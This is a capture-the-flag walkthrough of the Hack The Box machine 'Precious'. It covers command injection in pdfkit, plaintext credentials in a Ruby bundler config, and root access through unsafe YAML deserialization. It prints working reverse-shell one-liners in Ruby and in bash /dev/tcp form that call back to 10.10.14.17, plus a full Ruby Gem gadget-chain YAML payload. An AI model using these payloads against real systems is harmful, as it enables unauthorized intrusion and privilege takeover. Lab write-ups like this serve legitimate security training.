# Machine abstract

This Linux system hosts a web application capable of generating PDF files from websites using pdfkit. Unfortunately, a vulnerability in pdfkit exposes the application to Command Injection, potentially leading to Remote Code Execution (RCE).Once in the machone a plaintext password is stored in a user's home directory, posing a risk for lateral movement to other users on the system.The other user had permissions to execute a vulnerable Ruby script lacks password protection but requires a YAML file containing a payload granting root privileges to this user.


## Skills Learned
- Command Injection (Command Injection in pdfkit )
- Analysing and identifying vulnerable Ruby code


# Enumeration
## nmap

There were 2 ports open , port 22 and port 80 

## HTTP

With port 80, it seems like a webpage that convert web urls to pdf 

![Alt text](/assets/img/htb/Precious/p1.png)

When you try to analyze the response of the pdf , it exposes the technology behind and the version number `pdfkit v0.8.6` and the server behind it `X-Runtime: Ruby`

![Alt text](/assets/img/htb/Precious/p2.png)

Running exiftool on the downloaded pdf, it was also exposing the version number `pdfkit`

With this [PoC](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) I was able to get command injection with curl

![Alt text](/assets/img/htb/Precious/p3.png)

 We successfully receive a callback on our HTTP server, verifying that we have RCE on the target machine.

 # Foothold
 Since the application was running on ruby, I tried using ruby payload to get a reverse shell with [revshell](https://www.revshells.com/) though I URL encoded it 

```ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.17",4422))'
```

Started a Netcat listener on port 9001 and submit the payload on the web application using burp and successfully receive a shell as ruby ..

# Lateral Movement
After stabilizing the shell I pocked around and a `.bundle` directory in user's home directory, which commonly hosts configuration files used by Gem and other Ruby repositories.Inside the aforementioned directory, we can find a config file which reveals some plain-text credentials for the henry user. This configuration file typically stores bundler options, allowing users to save their credentials for each Gem source.

# Privilege Escalation
When typing `sudo -l` we can see a command we can run as root without any privileges

![Alt text](/assets/img/htb/Precious/p6.png)

Checking the ruby file , U can see it requires a certain file 

```ruby
....

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end
....

```

Runing the script, It requres the `dependencies.yml`

![Alt text](/assets/img/htb/Precious/p7.png)

Hunting for the dependencies.yml file, I found a sample folder with dependencies.yml and running the script, I got this 
```
henry@precious:/opt/sample$ /usr/bin/ruby /opt/update_dependencies.rb
Installed version differs from the one specified in file: yaml
Installed version is equals to the one specified in file: pdfkit
henry@precious:/opt/sample$ 
```

So this module provides a Ruby interface for data serialization in YAML format. Do not use YAML to load untrusted data. Doing so is unsafe and could allow malicious input to execute arbitrary code inside your application. Please see doc/security.rdoc for more information.
A search for Ruby deserialisation yields a popular [repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md), hosting an array of payloads useful for our
practices; they are all bound to versions between 2.0 and 3.0 , so we first check what version the target
machine is running.

```ruby
henry@precious:/opt/sample$ ruby -v
ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
```

And this this version seems vulnerabl  to this payload:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

With a bash paload `bash -c "bash -i >& /dev/tcp/10.10.14.17/4444 0>&1"` I was able to get a connection back with root 
privileges

```nmap
.... 
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: bash -c "bash -i >& /dev/tcp/10.10.14.17/4444 0>&1"
         method_id: :resolve

...
```

After running the script, I was able to get a reverse shell back as root
